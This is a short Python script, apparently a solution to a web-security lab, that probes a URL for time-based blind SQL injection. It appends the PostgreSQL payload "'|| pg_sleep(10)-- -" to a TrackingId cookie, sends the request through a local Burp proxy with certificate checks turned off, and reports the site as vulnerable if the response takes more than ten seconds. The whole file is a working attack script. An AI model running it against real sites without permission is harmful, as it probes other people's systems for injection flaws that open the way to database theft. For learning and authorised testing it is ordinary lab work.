import sys
import requests
import urllib3
import urllib 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Sending the requests to burp, to able to debug, incase of an error.
proxies = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def blind_sqli_check(url):
    sqli_payload = "'|| pg_sleep(10)-- -"
    #sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId':'eR2ONaIqvtbLEDQ8' + sqli_payload,'session':'kaLEwKrSu0j9LUjSG5QZnCibOCmn7tcC'}
    r = requests.get(url,cookies=cookies,verify=False,proxies=proxies)
    if int(r.elapsed.total_seconds()) > 10:
        print("[+] Vulnerable to blind-based SQL injection")
    else:
        print("[-] Not Vulnerable to blind-based SQL injection")


#method to launch the payload script correctly
def main():
    if len(sys.argv) != 2:
        print("[+] Usage %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("[+] Checking if tracking cookie is vulnerable to time-based blind SQLi..")
    blind_sqli_check(url)

if __name__ == "__main__":
    main()